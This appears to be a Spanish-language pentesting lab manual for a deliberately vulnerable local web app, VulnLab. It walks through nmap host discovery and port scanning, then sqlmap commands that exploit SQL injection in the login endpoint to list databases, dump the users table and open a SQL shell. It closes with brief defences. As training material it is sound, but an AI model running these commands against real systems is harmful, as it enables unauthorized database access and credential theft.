# Laboratorio de Pentesting: De la Red a la Base de Datos

Este manual detalla el proceso completo para preparar, descubrir, escanear y explotar la vulnerabilidad de SQL Injection en **VulnLab**.

## 0. Configuración del Entorno (ParrotOS / Kali)

Antes de comenzar, instala las herramientas necesarias y descarga el laboratorio.

**1. Instalar y Actualizar Herramientas:**

```bash
sudo apt update
sudo apt install git docker.io docker-compose nmap sqlmap -y
# Iniciar el servicio de Docker
sudo systemctl start docker
sudo systemctl enable docker

```

**2. Clonar el Repositorio:**

```bash
git clone https://github.com/williamstevencole/VulnLab.git
cd VulnLab

```

---

## 1. Escenario

Estás ante una red social moderna llamada **VulnLab**. El objetivo es demostrar cómo una mala implementación en el backend permite el acceso total a la información.

**Iniciar el Laboratorio:**

```bash
cd vulnerable
docker-compose up -d --build

```

* **Frontend:** React (Puerto 8000) -> `http://localhost:8000`
* **Backend (API):** Node.js (Puerto 8080) -> `http://localhost:8080`

---

## 2. Descubrimiento de Red (Host Discovery)

Identifica qué máquinas están activas en tu red local para encontrar el servidor.

**Comando para listar IPs activas:**

```bash
# Sustituye por tu rango de red (ej. 192.168.88.0/24 o 10.40.118.0/24)
sudo nmap 192.168.88.0/24

```

---

## 3. Escaneo de Puertos (Port Scanning)

Verificamos qué servicios están escuchando en la IP sospechosa detectada.

**Escaneo rápido de puertos específicos:**

```bash
nmap -p 8080,8000 <IP_OBJETIVO> --open

```

---

## 4. Enumeración de Servicios y Vulnerabilidades

Analizamos el backend para confirmar la tecnología utilizada (Express/PostgreSQL).

**Comando de detección:**

```bash
nmap -sV -sC -p 8080 <IP_OBJETIVO>

```

---

## 5. Explotación de Base de Datos (SQLMap)

El formulario de login en el puerto 8080 no sanitiza las entradas, lo que permite inyectar comandos SQL.

**Paso A: Listar todos los esquemas (databases)**
Utilizamos `--delay 1` para no saturar el servidor y `--ignore-code 500` porque el backend falla al recibir caracteres especiales.

```bash
sqlmap -u "http://<IP_OBJETIVO>:8080/login" \
  --data '{"username":"admin_sys","password":"123"}' \
  --method POST --header "Content-Type: application/json" \
  -p username --dbms postgres --delay 1 --batch --dbs

```

**Paso B: Listar las tablas del esquema `pentest_lab**`

```bash
sqlmap -u "http://<IP_OBJETIVO>:8080/login" \
  --data '{"username":"admin_sys","password":"123"}' \
  --method POST --header "Content-Type: application/json" \
  -p username --dbms postgres -D pentest_lab --tables --batch

```

**Paso C: Exfiltrar la tabla de usuarios (`users`)**

```bash
sqlmap -u "http://<IP_OBJETIVO>:8080/login" \
  --data '{"username":"admin_sys","password":"123"}' \
  --method POST --header "Content-Type: application/json" \
  -p username --dbms postgres -D pentest_lab -T users --dump --batch

```

**Paso D: Obtener una SQL Shell interactiva**

```bash
sqlmap -u "http://<IP_OBJETIVO>:8080/login" \
  --data '{"username":"admin_sys","password":"123"}' \
  --method POST --header "Content-Type: application/json" \
  -p username --dbms postgres --sql-shell

```
* **Consultas Parametrizadas:** (Uso de `$1`, `$2` en lugar de variables directas).
* **Esquemas Seguros:** Separación lógica de datos en PostgreSQL.
* **Hashing:** Las contraseñas en el entorno seguro no son legibles (Bcrypt).

